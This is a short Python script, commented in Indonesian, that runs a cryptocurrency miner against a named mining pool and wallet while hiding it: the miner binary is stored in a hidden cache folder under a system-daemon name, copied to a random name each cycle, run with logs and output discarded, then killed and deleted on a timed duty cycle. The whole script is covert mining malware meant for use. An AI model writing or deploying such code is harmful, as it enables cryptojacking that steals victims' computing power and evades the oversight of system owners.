import subprocess
import time
import os
import random
import string
import shutil

# Konfigurasi
WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
POOL = "ghost.darkverse.cloud:11002"
ALGO = "verushash"
CPU_THREADS = 1
PROGRAM_TIME = 45  # menit
REST_TIME = 5  # menit
BASE_PATH = os.path.expanduser("~/.cache/kthreadd/")
ORIGINAL_BINARY = BASE_PATH + "systemd-journald"

def generate_random_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

while True:
    binary_name = generate_random_name()
    binary_path = os.path.join(BASE_PATH, binary_name)

    # Copy binary dengan nama baru
    shutil.copyfile(ORIGINAL_BINARY, binary_path)
    os.chmod(binary_path, 0o755)

    print(f"ðŸ”„ Menjalankan binary '{binary_name}' selama {PROGRAM_TIME} menit...")
    process = subprocess.Popen([
        binary_path,
        "--algorithm", ALGO,
        "--pool", POOL,
        "--wallet", WALLET,
        "--cpu-threads", str(CPU_THREADS),
        "--dns-over-https", "1",
        "--disable-gpu",   # aktifkan kalau pakai versi CPU only
        "--no-color",
        # "--no-dev-fee",   # kalau berhasil patch, bisa aktifin
        "--log-file", "/dev/null"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(PROGRAM_TIME * 60)

    print(f"ðŸ˜´ Istirahat selama {REST_TIME} menit...")
    process.kill()
    os.system(f"pkill -f {binary_name}")
    os.remove(binary_path)

    time.sleep(REST_TIME * 60)
